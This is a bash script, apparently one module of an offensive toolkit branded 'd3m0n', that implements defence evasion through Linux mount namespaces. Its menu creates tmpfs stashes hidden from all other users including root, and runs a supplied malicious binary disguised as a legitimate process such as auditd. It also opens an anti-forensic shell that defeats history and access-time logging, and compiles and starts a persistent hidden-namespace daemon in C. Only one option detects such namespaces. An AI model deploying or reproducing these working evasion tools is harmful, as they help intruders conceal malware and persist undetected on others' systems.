#!/bin/bash
#
# Mount Namespace Stashspace (T1564.001)
# Hide files from ALL users + fileless process masquerading via mount namespaces
# Source: haxrob.net/hiding-in-plain-sight-mount-namespaces/
#
# Distinct from:
#   [28] Bind Mount Hide — hides /proc/PID entries
#   [33] Namespace Jail — traps users inside a fake namespace
# This technique:
#   - Creates isolated tmpfs mounts invisible to all other users (inc. root)
#   - Masquerades malicious processes as legitimate ones (fileless)
#   - Suppresses bash history + file access times
#   - Works as UNPRIVILEGED user via unshare -m -U --map-root-user
#

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
STASH_PID_FILE="/var/tmp/.d3m0n_stash_pid"

echo -e "${CYAN}"
echo "  ╔═══════════════════════════════════════════════════════╗"
echo "  ║       Mount Namespace Stashspace (T1564.001)          ║"
echo "  ║   Hide files from ALL users via isolated tmpfs mount  ║"
echo "  ║   + fileless process masquerading + anti-forensics    ║"
echo "  ╚═══════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "  ${CYAN}[1]${NC} Create stashspace (root — enter existing namespace)"
echo -e "  ${CYAN}[2]${NC} Create stashspace (unprivileged — new user namespace)"
echo -e "  ${CYAN}[3]${NC} Access existing stashspace"
echo -e "  ${CYAN}[4]${NC} Masquerade process (fileless execution)"
echo -e "  ${CYAN}[5]${NC} Anti-forensic shell (no history, no atime)"
echo -e "  ${CYAN}[6]${NC} Create persistent stashspace daemon"
echo -e "  ${CYAN}[7]${NC} Detect stashspaces on this host"
echo -e "  ${CYAN}[8]${NC} Cleanup"
echo ""
read -p "Choice [1-8]: " OPT

case "$OPT" in
    1)
        if [[ $(id -u) -ne 0 ]]; then
            echo -e "${RED}[-] Root required for this mode. Use option 2 for unprivileged.${NC}"
            exit 1
        fi

        echo -e "${YELLOW}[*] Available mount namespaces (non-init):${NC}"
        DEFAULT_NS=$(readlink /proc/$$/ns/mnt)
        ps -eo pid,comm --no-headers | while read -r pid comm; do
            [[ -e "/proc/$pid/ns/mnt" ]] || continue
            ns=$(readlink "/proc/$pid/ns/mnt" 2>/dev/null)
            [[ "$ns" != "$DEFAULT_NS" ]] && echo "  PID $pid ($comm) -> $ns"
        done 2>/dev/null | head -20

        read -p "Enter PID to join (e.g. NetworkManager PID): " JOIN_PID
        read -p "Path to mount tmpfs over [/root]: " STASH_PATH
        STASH_PATH="${STASH_PATH:-/root}"

        echo -e "${YELLOW}[*] Entering namespace of PID $JOIN_PID and mounting tmpfs on $STASH_PATH...${NC}"
        nsenter -t "$JOIN_PID" --mount /bin/bash -c "mount -t tmpfs tmpfs '${STASH_PATH}' && echo '[+] Stashspace created at ${STASH_PATH}' && exec /bin/bash"
        ;;
    2)
        echo -e "${YELLOW}[*] Creating unprivileged stashspace...${NC}"
        read -p "Path to mount tmpfs over [/tmp]: " STASH_PATH
        STASH_PATH="${STASH_PATH:-/tmp}"

        echo -e "${GREEN}[+] Entering new mount+user namespace...${NC}"
        echo -e "${YELLOW}[*] Files in ${STASH_PATH} will be invisible to all other users${NC}"
        echo -e "${YELLOW}[*] Type 'exit' to destroy the stashspace${NC}"
        unshare -m -U --map-root-user /bin/bash -c "mount -t tmpfs tmpfs '${STASH_PATH}' && echo -e '${GREEN}[+] Stashspace active at ${STASH_PATH}${NC}' && echo '[*] Namespace: '$(readlink /proc/self/ns/mnt) && exec /bin/bash"
        ;;
    3)
        if [[ ! -f "$STASH_PID_FILE" ]]; then
            echo -e "${YELLOW}[*] No saved stashspace PID. Scanning...${NC}"
            DEFAULT_NS=$(readlink /proc/$$/ns/mnt)
            echo -e "${YELLOW}  Non-default mount namespaces:${NC}"
            ps -eo pid,ppid,comm,mntns --no-headers 2>/dev/null | while read -r pid ppid comm mntns; do
                [[ "$ppid" == "2" ]] && continue
                [[ -e "/proc/$pid/ns/mnt" ]] || continue
                ns=$(readlink "/proc/$pid/ns/mnt" 2>/dev/null)
                [[ "$ns" != "$DEFAULT_NS" ]] && echo "  PID $pid ($comm) ns=$ns"
            done | sort -u | head -20
            echo ""
            read -p "Enter PID to access: " ACCESS_PID
        else
            ACCESS_PID=$(cat "$STASH_PID_FILE")
            echo -e "${GREEN}[+] Found stashspace daemon PID: $ACCESS_PID${NC}"
        fi

        if [[ $(id -u) -eq 0 ]]; then
            nsenter -t "$ACCESS_PID" -m /bin/bash
        else
            nsenter -t "$ACCESS_PID" -m -U --preserve-credentials /bin/bash
        fi
        ;;
    4)
        echo -e "${YELLOW}[*] Fileless process masquerading via mount namespace${NC}"
        read -p "Path to malicious binary: " MAL_BIN
        read -p "Legitimate process to masquerade as (e.g. /usr/sbin/auditd): " LEGIT_PATH

        if [[ ! -f "$MAL_BIN" ]]; then
            echo -e "${RED}[-] Binary not found: $MAL_BIN${NC}"
            exit 1
        fi

        LEGIT_DIR=$(dirname "$LEGIT_PATH")
        LEGIT_NAME=$(basename "$LEGIT_PATH")

        echo -e "${YELLOW}[*] Creating namespace, mounting tmpfs over ${LEGIT_DIR}, copying binary...${NC}"

        if [[ $(id -u) -eq 0 ]]; then
            unshare -m /bin/bash -c "
                mount -t tmpfs tmpfs '${LEGIT_DIR}'
                cp '${MAL_BIN}' '${LEGIT_PATH}'
                chmod 755 '${LEGIT_PATH}'
                echo '[+] Executing as ${LEGIT_PATH}...'
                '${LEGIT_PATH}' &
                MPID=\$!
                echo \"[+] Process masquerading as ${LEGIT_NAME} (PID \$MPID)\"
                echo \"[*] From outside: ps shows ${LEGIT_PATH}, readlink /proc/\$MPID/exe shows ${LEGIT_PATH}\"
                echo \"[*] Binary never touches physical disk\"
                wait \$MPID
            "
        else
            unshare -m -U --map-root-user /bin/bash -c "
                mount -t tmpfs tmpfs '${LEGIT_DIR}'
                cp '${MAL_BIN}' '${LEGIT_PATH}'
                chmod 755 '${LEGIT_PATH}'
                echo '[+] Executing as ${LEGIT_PATH}...'
                '${LEGIT_PATH}' &
                MPID=\$!
                echo \"[+] Process masquerading as ${LEGIT_NAME} (PID \$MPID)\"
                wait \$MPID
            "
        fi
        ;;
    5)
        echo -e "${YELLOW}[*] Anti-forensic shell: no bash history, no file access times${NC}"

        ANTIFOR_SCRIPT=$(mktemp /tmp/.d3m0n_af_XXXX.sh)
        cat > "$ANTIFOR_SCRIPT" << 'AFEOF'
#!/bin/bash
# Mount tmpfs over $HOME to suppress .bash_history
mount -t tmpfs tmpfs "$HOME" 2>/dev/null

# Bind mount /dev/null over common files that update atime
for f in /etc/nsswitch.conf /etc/bash.bashrc /etc/profile; do
    [ -f "$f" ] && mount --bind /dev/null "$f" 2>/dev/null
done

echo "[+] Anti-forensic shell active"
echo "    - \$HOME is tmpfs (history lost on exit)"
echo "    - Common system files bind-mounted to /dev/null"
exec /bin/bash --norc --noprofile
AFEOF
        chmod 700 "$ANTIFOR_SCRIPT"

        if [[ $(id -u) -eq 0 ]]; then
            unshare -m /bin/bash "$ANTIFOR_SCRIPT"
        else
            unshare -m -U --map-root-user /bin/bash "$ANTIFOR_SCRIPT"
        fi
        rm -f "$ANTIFOR_SCRIPT"
        ;;
    6)
        echo -e "${YELLOW}[*] Creating persistent stashspace daemon...${NC}"
        read -p "Stash path [/tmp]: " STASH_PATH
        STASH_PATH="${STASH_PATH:-/tmp}"

        DAEMON_SRC=$(mktemp /tmp/.d3m0n_stashd_XXXX.c)
        cat > "$DAEMON_SRC" << CEOF
#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mount.h>
#include <signal.h>

int main(int argc, char *argv[]) {
    char *stash_path = argc > 1 ? argv[1] : "/tmp";
    char map_buf[64];
    int fd;

    // Daemonize
    if (fork() != 0) exit(0);
    setsid();

    // Create new mount + user namespaces
    if (unshare(CLONE_NEWNS | CLONE_NEWUSER) != 0) {
        perror("unshare");
        exit(1);
    }

    // Map UID/GID
    fd = open("/proc/self/setgroups", O_WRONLY);
    if (fd >= 0) { write(fd, "deny", 4); close(fd); }

    snprintf(map_buf, sizeof(map_buf), "0 %d 1", getuid());
    fd = open("/proc/self/uid_map", O_WRONLY);
    if (fd >= 0) { write(fd, map_buf, strlen(map_buf)); close(fd); }

    snprintf(map_buf, sizeof(map_buf), "0 %d 1", getgid());
    fd = open("/proc/self/gid_map", O_WRONLY);
    if (fd >= 0) { write(fd, map_buf, strlen(map_buf)); close(fd); }

    // Mount tmpfs
    if (mount("tmpfs", stash_path, "tmpfs", 0, NULL) != 0) {
        perror("mount");
        exit(1);
    }

    fprintf(stderr, "[+] Stashspace daemon PID %d, path %s\n", getpid(), stash_path);

    // Keep alive
    pause();
    return 0;
}
CEOF

        if command -v gcc >/dev/null 2>&1; then
            DAEMON_BIN="/var/tmp/.d3m0n_stashd"
            gcc -o "$DAEMON_BIN" "$DAEMON_SRC" -static 2>/dev/null || gcc -o "$DAEMON_BIN" "$DAEMON_SRC" 2>/dev/null
            rm -f "$DAEMON_SRC"

            if [[ -f "$DAEMON_BIN" ]]; then
                "$DAEMON_BIN" "$STASH_PATH" &
                sleep 0.5
                DPID=$(pgrep -f "d3m0n_stashd" | tail -1)
                if [[ -n "$DPID" ]]; then
                    echo "$DPID" > "$STASH_PID_FILE"
                    echo -e "${GREEN}[+] Stashspace daemon running (PID $DPID)${NC}"
                    echo -e "${GREEN}[+] Access: nsenter -t $DPID -m -U --preserve-credentials /bin/bash${NC}"
                else
                    echo -e "${RED}[-] Daemon failed to start${NC}"
                fi
            else
                echo -e "${RED}[-] Compilation failed${NC}"
            fi
        else
            echo -e "${RED}[-] gcc not found${NC}"
            rm -f "$DAEMON_SRC"
        fi
        ;;
    7)
        echo -e "${YELLOW}[*] Scanning for non-default mount namespaces...${NC}"
        DEFAULT_NS=$(readlink /proc/$$/ns/mnt)
        FOUND=0

        ps -eo pid,ppid,comm --no-headers 2>/dev/null | while read -r pid ppid comm; do
            [[ "$ppid" == "2" ]] && continue
            [[ -e "/proc/$pid/ns/mnt" ]] || continue
            ns=$(readlink "/proc/$pid/ns/mnt" 2>/dev/null)
            [[ "$ns" == "$DEFAULT_NS" ]] && continue
            grep -qE 'system.slice|init.scope|systemd' "/proc/$pid/cgroup" 2>/dev/null && continue
            echo -e "  ${RED}[!]${NC} PID $pid ($comm) — ns=$ns"
            FOUND=1
        done

        [[ "$FOUND" -eq 0 ]] && echo -e "  ${GREEN}No suspicious namespaces found${NC}"
        ;;
    8)
        echo -e "${YELLOW}[*] Cleaning up...${NC}"
        if [[ -f "$STASH_PID_FILE" ]]; then
            DPID=$(cat "$STASH_PID_FILE")
            kill "$DPID" 2>/dev/null
            rm -f "$STASH_PID_FILE"
            echo -e "  Killed daemon PID $DPID"
        fi
        rm -f /var/tmp/.d3m0n_stashd
        echo -e "${GREEN}[+] Cleanup done${NC}"
        ;;
    *)
        echo "Invalid option"
        ;;
esac
